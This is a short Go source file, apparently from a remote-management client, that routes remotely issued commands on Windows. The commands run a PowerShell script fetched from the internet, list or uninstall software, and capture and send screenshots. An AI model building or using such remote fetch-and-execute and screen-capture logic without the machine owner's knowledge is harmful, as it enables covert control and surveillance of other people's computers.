//go:build windows
// +build windows

package windows

import (
	c "corpotecht_client/common"
	"corpotecht_client/crossplatform"
	"corpotecht_client/utils"
	"log"
)

func HandleDirective(directive c.Directive) {
	defer utils.RecoverFromCrash()

	switch directive.Command {
	case "powershell":
		if len(directive.Parameters) > 0 {
			executePowershellScriptFromInternet(directive.Parameters[0])
		} else {
			log.Println("Invalid directive received.")
		}

	case "listsoftware":
		getInstalledSoftware()
	case "uninstall":
		uninstallSoftware(directive.Parameters)
	case "screenshot":
		crossplatform.TakeAndSendScreenshot()

	}
}
